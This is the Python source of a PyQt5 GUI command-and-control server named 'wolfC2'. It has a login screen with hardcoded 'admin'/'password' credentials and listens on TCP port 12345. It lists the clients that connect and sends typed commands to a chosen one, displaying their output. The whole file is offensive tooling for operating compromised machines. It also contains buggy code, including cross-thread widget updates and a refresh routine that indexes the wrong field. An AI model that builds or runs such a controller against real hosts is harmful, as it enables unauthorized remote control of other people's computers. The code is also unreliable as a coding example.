import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, QLineEdit, QTextEdit, QMessageBox, QListWidget
from PyQt5.QtGui import *
import socket
import threading
from PyQt5.QtCore import Qt
from PyQt5.QtWidgets import *

class LoginWindow(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.initUI()

    def initUI(self):
        self.setWindowTitle("Login Page")

        self.username_label = QLabel("Username:")
        self.username_entry = QLineEdit()

        self.password_label = QLabel("Password:")
        self.password_entry = QLineEdit()
        self.password_entry.setEchoMode(QLineEdit.Password)

        self.login_button = QPushButton("Login")
        self.login_button.clicked.connect(self.login)

        layout = QFormLayout()
        layout.addRow("", QLabel("<h1 style='color: #00FF00;'>wolfC2 Server</h1>"))  # Styled title
        layout.addRow(self.username_label, self.username_entry)
        layout.addRow(self.password_label, self.password_entry)
        layout.addRow(self.login_button)
        spacer = QSpacerItem(20, 20, QSizePolicy.Minimum, QSizePolicy.Expanding)
        layout.addItem(spacer)

        widget = QWidget()
        widget.setLayout(layout)

        main_layout = QVBoxLayout()
        main_layout.addWidget(widget)
        main_layout.setAlignment(Qt.AlignCenter)
        main_layout.setContentsMargins(50, 50, 50, 50)
        self.setLayout(main_layout)

        self.setStyleSheet("""
            background-color: #222;
            color: #00FF00;
            font-size: 16px;
        """)



    def login(self):
        username = self.username_entry.text()
        password = self.password_entry.text()

        if username == "admin" and password == "password":
            self.parent().showDashboard()
        else:
            QMessageBox.warning(self, "Login Failed", "Invalid username or password", QMessageBox.Ok)

class C2Server(QWidget):
    def __init__(self):
        super().__init__()
        self.active_clients = []
        self.initUI()
        self.start_server()

    def initUI(self):
        self.setWindowTitle("C2 Server")
        self.setGeometry(100, 100, 800, 600)
        self.setStyleSheet("background-color: black; color: #00FF00; font-size: 12pt;")

        self.log_text = QLabel("", self)
        self.log_text.setAlignment(Qt.AlignCenter)
        self.log_text.setFont(QFont("Courier", 14))
        self.log_text.setStyleSheet("background-color: black; color: #00FF00;")

        self.client_list = QListWidget(self)
        self.client_list.setStyleSheet("background-color: black; color: #00FF00; font-size: 12pt;")

        self.connect_button = QPushButton("Connect", self)
        self.connect_button.setStyleSheet("background-color: black; color: #00FF00; font-size: 12pt;")
        self.connect_button.clicked.connect(self.connect_to_client)

        self.command_input = QLineEdit(self)
        self.command_input.setStyleSheet("background-color: black; color: #00FF00; font-size: 12pt;")

        self.send_button = QPushButton("Send Command", self)
        self.send_button.setStyleSheet("background-color: black; color: #00FF00; font-size: 12pt;")
        self.send_button.clicked.connect(self.send_command)

        self.refresh_button = QPushButton("Refresh", self)
        self.refresh_button.setStyleSheet("background-color: black; color: #00FF00; font-size: 12pt;")
        self.refresh_button.clicked.connect(self.refresh)

        self.output_text = QTextEdit(self)
        self.output_text.setReadOnly(True)
        self.output_text.setStyleSheet("background-color: black; color: #00FF00; font-size: 12pt;")

        layout = QVBoxLayout()
        layout.addWidget(self.log_text)
        layout.addWidget(self.client_list)
        layout.addWidget(self.connect_button)
        layout.addWidget(self.command_input)
        layout.addWidget(self.send_button)
        layout.addWidget(self.refresh_button)
        layout.addWidget(self.output_text)
        self.setLayout(layout)

    def start_server(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(('0.0.0.0', 12345))
        self.server.listen(5)

        accept_thread = threading.Thread(target=self.accept_clients)
        accept_thread.daemon = True
        accept_thread.start()

    def accept_clients(self):
        while True:
            client, addr = self.server.accept()
            self.active_clients.append((client, addr))
            self.client_list.addItem(f"{addr[0]}:{addr[1]}")

    def connect_to_client(self):
        selected_client_idx = self.client_list.currentRow()
        if selected_client_idx >= 0:
            selected_client, selected_addr = self.active_clients[selected_client_idx]
            self.start_client_thread(selected_client, selected_addr)
        else:
            QMessageBox.warning(self, "Connection Error", "Please select a device.")

    def start_client_thread(self, client, addr):
        client_thread = threading.Thread(target=self.handle_client, args=(client, addr))
        client_thread.daemon = True
        client_thread.start()

    def handle_client(self, client, addr):
        self.output_text.append(f'Client connected from {addr}')

        while True:
            command = client.recv(4096).decode()
            if not command:
                break

            self.output_text.append(f'Output from {addr}: {command}')

    def send_command(self):
        selected_client_idx = self.client_list.currentRow()
        if selected_client_idx >= 0:
            selected_client, selected_addr = self.active_clients[selected_client_idx]
            command = self.command_input.text()
            selected_client.send(command.encode())
            self.command_input.clear()
            self.output_text.append(f'Sent command to {selected_addr}: {command}')
        else:
            QMessageBox.warning(self, "Command Error", "Please select a device.")

    def refresh(self):
        self.client_list.clear()
        for addr in [addr[1] for addr in self.active_clients]:
            self.client_list.addItem(f"{addr[0]}:{addr[1]}")

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("C2 Server App")
        self.setGeometry(100, 100, 800, 600)  # Set window size and position

        self.login_window = LoginWindow(self)
        self.dashboard_window = C2Server()
        self.setCentralWidget(self.login_window)

    def showDashboard(self):
        self.setCentralWidget(self.dashboard_window)

    def showLogin(self):
        self.login_window.username_entry.clear()
        self.login_window.password_entry.clear()
        self.setCentralWidget(self.login_window)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
